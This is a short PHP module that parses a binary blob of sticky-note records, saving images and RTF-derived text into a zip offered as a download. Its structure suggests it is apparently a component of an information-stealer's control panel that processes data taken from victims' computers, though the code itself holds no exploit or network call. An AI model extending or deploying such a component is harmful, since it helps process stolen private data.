<?php
//ok
class Module_stickies extends Module_
{
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
		
            $stream = new Stream($Data, strlen($Data));

            $FileDeB = GetTempFile('Stick');
            $ZIP_ = NewZipFile($FileDeB);
			
            if($ZIP_)
            {
                if(AddFolderToZip($ZIP_, "IMG"))
                {
					$Result = '';
					$Cnt = 1;
					
                    while(TRUE)
                    {
                        $Type = $stream->GetDWORD();
                        if($Type === NULL)
                            break;

                        $File = $stream->GetBINARY_();
                        if($File === NULL)
                            break;
						
                        if($Type == 1)
                        {
                            AddBufferToZip($ZIP_, "IMG\\img_". $Cnt . ".png", $File);
							$Cnt++;
                        }
                        else if($Type == 0)
                        {
                            $Result .= rtf2text($File) . "\r\n";
                            $Result .= str_pad("", 30, "-") . "\r\n";
                        }
                    }
                }
				AddBufferToZip($ZIP_, "Notes.txt", $Result);
                SaveZip($ZIP_);
				
				$Data____ = file_get_contents($FileDeB);
				$this->insert_downloads(substr($Result, 0, 20) . ".zip", $Data____);
				$Data____ = NULL;
            }
			
			
			@unlink($FileDeB);
			$stream = $FileDeB = $ZIP_ = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
